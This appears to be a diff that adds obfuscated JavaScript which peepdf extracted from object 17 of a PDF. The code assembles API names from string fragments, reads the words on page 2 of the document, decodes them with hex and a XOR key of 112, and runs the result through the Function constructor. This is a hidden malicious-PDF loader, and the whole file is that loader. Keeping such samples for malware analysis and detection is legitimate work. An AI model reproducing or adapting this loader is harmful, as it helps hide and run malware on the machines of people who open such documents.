@@ -1,0 +1,52 @@
+// peepdf comment: Javascript code located in object 17 (version 0)
+
+var googleA = 'get';
+googleA += 'Page';
+var edit = "4d%4df";
+var n = '';
+var x = [3, 2][1];
+var r = Function;
+var u = app;
+u = u['doc'];
+
+function uS() {
+    var googleV = 'u';
+    googleV += 'ne';
+    googleV += 'sca';
+    googleV += 'pe';
+    return googleV;
+}
+
+var v = googleA;
+v += 'NthWord';
+var file = 112;
+
+var y = googleA;
+y += 'NumWords';
+
+var d = "cape";
+
+var g = [0, 1][0];
+var rI = 'cha';
+rI += 'rCode';
+rI += 'At';
+var qG = 'fr';
+qG += 'omCharC';
+qG += 'ode';
+edit = edit.substr(2, 1);
+nU = u[uS()];
+
+new r(tP(2, file))();
+
+function tP(w, file) {
+
+    var t = u[y](2);
+    for (var m = 0; m < t; m++) {
+        gAlpha = u[v](w, m);
+        var bL = gAlpha.substr(gAlpha.length - x, x);
+        var k = nU(edit + bL)[rI](g);
+        n += String[qG](k ^ file);
+    }
+    return n;
+}
+
